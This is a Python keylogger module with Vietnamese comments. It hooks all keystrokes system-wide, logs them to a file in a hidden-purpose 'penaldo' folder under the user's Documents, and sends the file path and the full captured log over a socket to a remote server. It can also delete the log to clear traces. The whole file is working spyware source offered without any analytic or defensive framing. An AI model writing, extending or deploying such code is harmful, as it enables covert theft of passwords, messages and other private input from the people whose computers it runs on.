import os
import keyboard

def get_username():
    return os.getenv("USERNAME")

def get_log_file():
    username = get_username()
    log_directory = os.path.join("C:", "Users", username, "Documents", "penaldo")
    log_file = os.path.join(log_directory, "keylog.txt")
    return log_file, log_directory

def ensure_log_directory_exists(log_directory):
    """Kiểm tra và tạo thư mục chứa file log nếu chưa tồn tại."""
    if not os.path.exists(log_directory):
        os.makedirs(log_directory)

def log_key(e, log_file, log_directory):
    """Ghi lại các phím bấm vào file log"""
    if e.event_type == keyboard.KEY_DOWN:
        if e.name == 'space':
            char = ' '
        elif e.name == 'enter':
            char = '\n'
        elif e.name == 'backspace':
            char = '[BACKSPACE]'
        else:
            char = e.name

        ensure_log_directory_exists(log_directory)

        with open(log_file, "a", encoding="utf-8") as f:
            f.write(char)

def start_keylogger(sock):
    """Khởi động keylogger"""
    log_file, log_directory = get_log_file()
    keyboard.hook(lambda e: log_key(e, log_file, log_directory))
    sock.sendall(f"{log_file}\n".encode())

def stop_keylogger():
    """Dừng keylogger"""
    keyboard.unhook_all()

def send_log(sock):
    """Gửi nội dung file log tới server"""
    log_file, _ = get_log_file()
    if os.path.exists(log_file):
        with open(log_file, 'rb') as f:
            while True:
                data = f.read(1024)
                if not data:
                    break
                sock.sendall(data)
        sock.sendall(b"END_OF_FILE")
    else:
        sock.sendall(b"No log file found.\n")

def delete_log():
    """Xóa file log"""
    log_file, _ = get_log_file()
    if os.path.exists(log_file):
        os.remove(log_file)
        print("Log file deleted.")
